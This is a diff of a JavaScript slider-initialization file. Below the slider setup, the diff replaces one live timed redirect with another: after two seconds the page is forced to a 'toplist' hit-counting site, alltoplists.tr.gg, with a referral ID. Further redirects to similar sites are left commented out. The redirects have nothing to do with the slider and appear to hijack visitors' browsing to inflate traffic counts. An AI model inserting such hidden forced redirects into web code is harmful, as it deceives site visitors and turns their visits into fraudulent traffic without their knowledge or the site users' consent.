@@ -135,15 +135,12 @@ const initSlider = function (currentSlider) {
 }
 for (let i = 0, len = sliders.length; i < len; i++) { initSlider(sliders[i]); }
 
- setTimeout(function() {
-  window.location.href = "https://10hit.tr.gg?in=445";
-}, 2000);
-
-
- /*
- setTimeout(function() {
+setTimeout(function() {
   window.location.href = "https://alltoplists.tr.gg?in=20";
 }, 2000);
+
+ /*
+
   setTimeout(function() {
   window.location.href = "https://detaytoplist.tr.gg?in=637";
 }, 2000);
